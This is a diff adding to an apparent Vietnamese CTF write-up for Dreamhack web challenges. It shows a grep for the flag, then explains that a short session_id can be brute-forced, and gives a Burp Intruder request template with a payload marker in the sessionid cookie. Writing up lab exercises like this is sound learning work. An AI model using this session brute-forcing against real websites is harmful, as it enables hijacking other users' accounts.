@@ -29,4 +29,30 @@ print(m)
 ## devtools-sources
 - Dont need devtools i need a penguin
 ```grep -r "DH{" *```
-## 
+## session
+
+- Ở đây server phân biệt người dùng này với người dùng khác qua session_id. 
+- Tuy nhiên độ dài của nó khá ngắn nên chúng ta có thể bf ra được.
+
+![image](https://github.com/user-attachments/assets/4ed8bf4a-4263-49e8-ae56-b7653d5f75f7)
+
+- Mình sẽ dùng brup để bf:
+
+```
+GET / HTTP/1.1
+Host: host3.dreamhack.games:10491
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US
+Referer: http://host3.dreamhack.games:10491/login
+Accept-Encoding: gzip, deflate, br
+Cookie: sessionid=§i§
+Connection: keep-alive
+```
+
+![image](https://github.com/user-attachments/assets/f65d445a-37a8-4552-bcba-6c885ca35c5b)
+
+![image](https://github.com/user-attachments/assets/b7f2f260-2c44-427b-8f80-e6d8a63472f4)
+
